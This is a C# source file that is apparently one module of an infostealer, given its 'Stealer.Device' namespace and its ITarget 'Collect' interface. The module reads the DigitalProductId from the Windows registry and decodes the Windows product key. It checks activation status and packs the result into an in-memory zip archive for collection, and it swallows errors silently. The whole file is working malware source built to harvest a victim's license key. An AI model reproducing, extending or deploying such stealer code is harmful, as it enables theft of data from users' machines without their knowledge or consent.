using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class ProductKey : ITarget
    {
        private enum DigitalProductIdVersion
        {
            UpToWindows7,
            Windows8AndUp
        }

        public void Collect(InMemoryZip zip, Counter counter)
    {
        try
        {
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
            object obj = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?.GetValue("DigitalProductId");
            if (obj != null)
            {
                byte[] digitalProductId = (byte[])obj;
                registryKey.Close();
                bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
                string windowsProductKeyFromDigitalProductId = GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
                if (!string.IsNullOrEmpty(windowsProductKeyFromDigitalProductId))
                {
                    string text = (IsWindowsActivatedFast() ? "Activated ✅" : "Not Activated ❌");
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.AppendLine("=== Windows Product Key Info ===");
                    stringBuilder.AppendLine("Status : " + text);
                    stringBuilder.AppendLine("Key    : " + windowsProductKeyFromDigitalProductId);
                    stringBuilder.AppendLine("================================");
                    zip.AddTextFile("ProductKey.txt", stringBuilder.ToString());
                }
            }
        }
        catch
        {
        }
    }

        private string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
    {
        string text = string.Empty;
        byte b = (byte)((digitalProductId[66] / 6) & 1);
        digitalProductId[66] = (byte)((digitalProductId[66] & 0xF7) | ((b & 2) * 4));
        int num = 0;
        for (int num2 = 24; num2 >= 0; num2--)
        {
            int num3 = 0;
            for (int num4 = 14; num4 >= 0; num4--)
            {
                num3 *= 256;
                num3 = digitalProductId[num4 + 52] + num3;
                digitalProductId[num4 + 52] = (byte)(num3 / 24);
                num3 %= 24;
                num = num3;
            }
            text = "BCDFGHJKMPQRTVWXY2346789"[num3] + text;
        }
        string text2 = text.Substring(1, num);
        string text3 = text.Substring(num + 1, text.Length - (num + 1));
        text = text2 + "N" + text3;
        for (int i = 5; i < text.Length; i += 6)
        {
            text = text.Insert(i, "-");
        }
        return text;
    }

        private string DecodeProductKey(byte[] digitalProductId)
    {
        char[] array = new char[24]
        {
            'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P',
            'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4',
            '6', '7', '8', '9'
        };
        char[] array2 = new char[29];
        ArrayList arrayList = new ArrayList();
        for (int i = 52; i <= 67; i++)
        {
            arrayList.Add(digitalProductId[i]);
        }
        for (int num = 28; num >= 0; num--)
        {
            if ((num + 1) % 6 == 0)
            {
                array2[num] = '-';
            }
            else
            {
                int num2 = 0;
                for (int num3 = 14; num3 >= 0; num3--)
                {
                    int num4 = (num2 << 8) | (byte)arrayList[num3];
                    arrayList[num3] = (byte)(num4 / 24);
                    num2 = num4 % 24;
                    array2[num] = array[num2];
                }
            }
        }
        return new string(array2);
    }

        private string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, DigitalProductIdVersion digitalProductIdVersion)
    {
        if (digitalProductIdVersion != DigitalProductIdVersion.Windows8AndUp)
        {
            return DecodeProductKey(digitalProductId);
        }
        return DecodeProductKeyWin8AndUp(digitalProductId);
    }

        private static bool IsWindowsActivatedFast()
        {
            try
            {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform"))
                {
                    if (registryKey != null)
                    {
                        object value = registryKey.GetValue("BackupProductKeyDefault");
                        return value != null && value.ToString().Length > 0;
                    }
                }
            }
            catch
            {
            }
            return false;
        }
    }
}
